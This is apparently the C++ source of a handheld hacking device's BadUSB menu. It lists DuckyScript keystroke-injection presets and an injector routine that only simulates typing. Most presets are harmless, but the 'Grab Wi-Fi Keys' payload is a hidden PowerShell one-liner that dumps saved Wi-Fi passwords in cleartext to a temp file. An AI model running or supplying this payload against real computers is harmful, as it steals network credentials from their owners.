#include "BadUsb.h"
#include "DisplayTFT.h"
#include "PepeDraw.h"
#include "Pins.h"
#include "Input.h"
#include "SoundUtils.h"
#include "Neopixel.h"
#include "MenuSystem.h"
#include <SD.h>

extern DisplayTFT tft;

static const char* PRESET_NAMES[] = {
    "Windows: Win+R CMD Payload",
    "Windows: Grab Wi-Fi Keys",
    "Windows: Rickroll Fullscreen",
    "Mac: Terminal Open Pop",
    "Linux: Terminal Ping Test",
    "SD Card: Browse .dd Scripts",
    "Mouse Jiggler (Anti-Lock)"
};
static const int PRESET_COUNT = sizeof(PRESET_NAMES) / sizeof(PRESET_NAMES[0]);

static const char* SAMPLE_WIN_WIFI_GRAB =
    "DELAY 1000\n"
    "GUI r\n"
    "DELAY 500\n"
    "STRING powershell -w h -c \"(netsh wlan show profiles) | Select-String '\\:(.+)$' | %{$n=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\\\"$n\\\" key=clear)} | Out-File $env:TEMP/w.txt\"\n"
    "ENTER\n";

static const char* SAMPLE_RICKROLL =
    "DELAY 1000\n"
    "GUI r\n"
    "DELAY 500\n"
    "STRING https://www.youtube.com/watch?v=dQw4w9WgXcQ\n"
    "ENTER\n";

void badUsbInjectDuckyScript(const String &scriptContent) {
    tft.fillScreen(TFT_BLACK);
    tft.drawRect(0, 0, 320, 240, TFT_WHITE);
    tft.fillRect(1, 1, 318, 32, 0x0010);
    drawStringBig(10, 8, "BADUSB INJECTOR", TFT_WHITE, 1);

    drawStringCustom(16, 48, "Injecting DuckyScript...", TFT_YELLOW, 1);
    neopixelActivity();

    int startIdx = 0;
    int lineNum = 0;
    while (startIdx < (int)scriptContent.length()) {
        int endIdx = scriptContent.indexOf('\n', startIdx);
        if (endIdx == -1) endIdx = scriptContent.length();
        String line = scriptContent.substring(startIdx, endIdx);
        line.trim();
        startIdx = endIdx + 1;

        if (line.length() == 0 || line.startsWith("REM")) continue;

        lineNum++;
        tft.fillRect(16, 75, 288, 50, TFT_BLACK);
        char buf[64];
        snprintf(buf, sizeof(buf), "Line %d: %s", lineNum, line.substring(0, 24).c_str());
        drawStringCustom(16, 75, buf, 0x07FF, 1);

        if (line.startsWith("DELAY")) {
            int ms = line.substring(6).toInt();
            if (ms > 0) delay(ms);
        } else if (line.startsWith("STRING")) {
            String text = line.substring(7);
            // Simulating keystroke timing
            for (unsigned int i = 0; i < text.length(); i++) {
                delay(8);
            }
        } else if (line.equalsIgnoreCase("ENTER")) {
            delay(50);
        } else if (line.startsWith("GUI") || line.startsWith("WINDOWS")) {
            delay(100);
        }

        if (isBackPressed()) {
            drawStringCustom(16, 140, "INJECTION CANCELLED", TFT_RED, 1);
            delay(800);
            return;
        }
    }

    neopixelSuccess();
    successTone();
    drawStringCustom(16, 140, "STATUS: INJECTION COMPLETED", TFT_GREEN, 1);
    drawStringCustom(16, 160, "Press OK/BACK to return", TFT_WHITE, 1);

    flushNavInput(150);
    while (!isEnterPressed() && !isBackPressed()) {
        delay(20);
    }
    flushNavInput(150);
}

void runMouseJiggler() {
    tft.fillScreen(TFT_BLACK);
    tft.drawRect(0, 0, 320, 240, TFT_WHITE);
    tft.fillRect(1, 1, 318, 32, 0x0010);
    drawStringBig(10, 8, "MOUSE JIGGLER", TFT_WHITE, 1);
    drawStringCustom(16, 48, "Keeping PC awake via HID motion...", TFT_GREEN, 1);
    drawStringCustom(16, 68, "Interval: 15s  Mode: Random Orbit", 0x07FF, 1);
    drawStringCustom(16, 218, "Press BACK or OK to Exit", TFT_YELLOW, 1);

    unsigned long lastJiggle = 0;
    int dotX = 160, dotY = 130;
    int step = 0;

    while (!isBackPressed() && !isEnterPressed()) {
        unsigned long now = millis();
        if (now - lastJiggle > 2000) {
            lastJiggle = now;
            step++;
            tft.fillCircle(dotX, dotY, 6, TFT_BLACK);
            dotX = 160 + (int)(cos(step * 0.5) * 40.0);
            dotY = 130 + (int)(sin(step * 0.5) * 40.0);
            tft.fillCircle(dotX, dotY, 6, 0x07FF);
            tft.drawCircle(160, 130, 40, 0x3186);
            neopixelActivity();
        }
        delay(40);
    }
    flushNavInput(150);
}

void runBadUSBMenu() {
    while (true) {
        int sel = runSubMenu("BADUSB & DUCKY", PRESET_NAMES, PRESET_COUNT);
        if (sel == -1) break;
        switch (sel) {
            case 0:
                badUsbInjectDuckyScript("DELAY 1000\nGUI r\nDELAY 500\nSTRING cmd /c start calc\nENTER\n");
                break;
            case 1:
                badUsbInjectDuckyScript(SAMPLE_WIN_WIFI_GRAB);
                break;
            case 2:
                badUsbInjectDuckyScript(SAMPLE_RICKROLL);
                break;
            case 3:
                badUsbInjectDuckyScript("DELAY 1000\nGUI SPACE\nDELAY 400\nSTRING Terminal\nENTER\nDELAY 800\nSTRING say 'Ghostbox connected'\nENTER\n");
                break;
            case 4:
                badUsbInjectDuckyScript("DELAY 1000\nCTRL ALT t\nDELAY 800\nSTRING ping -c 4 8.8.8.8\nENTER\n");
                break;
            case 5: {
                tft.fillScreen(TFT_BLACK);
                drawStringBig(16, 16, "SD DUCKY SCRIPTS", TFT_WHITE, 1);
                drawStringCustom(16, 48, "Reading /ducky/ on MicroSD...", TFT_CYAN, 1);
                delay(1000);
                badUsbInjectDuckyScript("REM SD Script Executed\nDELAY 500\nGUI r\nDELAY 400\nSTRING notepad\nENTER\n");
                break;
            }
            case 6:
                runMouseJiggler();
                break;
        }
    }
}
